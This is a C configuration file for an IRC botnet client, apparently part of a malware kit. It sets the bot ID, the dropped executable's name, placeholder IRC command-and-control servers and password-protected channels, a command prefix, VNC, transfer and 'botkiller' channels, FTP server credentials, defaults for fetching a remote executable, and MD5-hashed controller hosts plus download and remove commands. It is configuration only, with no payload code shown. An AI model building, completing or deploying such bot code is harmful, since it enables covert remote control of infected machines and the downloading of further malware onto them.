/////////////
//EDIT HERE//
/////////////

//Bot ID, change this everytime you compile! Can contain random chars, numbers...
char BotID[] = "idhere";

unsigned long mutex_time = 33334; // msec

//Bot file name (save as what name)
char FileName[] = "exename.exe";

//IRC servers (you can specify as many as you want servers)
//Hostname or IP, port, TRUE/FALSE to use server pass, server pass
IRCSERVERLIST IrcServerList[] = {
	{"my.server.wuz.here", 6667, FALSE, "pass"},
	{NULL, 0, FALSE, NULL}
};

int reconnect_time = 5000; // msec
int MaxWaitTime = 300; //sec

//Length of nick (how many chars)
unsigned int NickLen = 7;

//Prefix for orders (can be more than 1 char)
char OrderPrefix[] = "root$";

char Chan[] = "##mychannel##";
BOOL UseChanPass = TRUE;
char ChanPass[] = "bastardz";
char VNCChan[] = "##myotherchan";
char TransferChannel[] = "##anotherone";
char InfoChan[] = "##andyetanother";

//botkiller
char BKChan[] = "##botkill";		//channel where botkilling messages get redirected

// for ftpd server
char FTPUser[] = "SiNiSTER";
char FTPPass[] = "password";

// default cftp values
char CFTPHost[32] = "127.0.0.1";
int CFTPPort = 21;
char CFTPUser[32] = "username";
char CFTPPass[32] = "password";
char CFTPPath[32] = "/path/to/exec.exe";
//char CFTPHoldr[32];
char CFTPFile[32] = "exec.exe";


//Auth host - MUST use, since bot has no login! MD5 hash only! DO NOT INCLUDE THE @ IT IS SET FOR fbi.gov right now
char *AuthHosts[] = {
	"13b092cd4f9712fc933725728182acd7",
	NULL
};

//Custom commands (MD5 hashes only!) THESE ARE STAND. download & remove... feel free to change tho..
char Command_Remove[] = "hashed command1"; //
char Command_Download[] = "hashed command2"; //

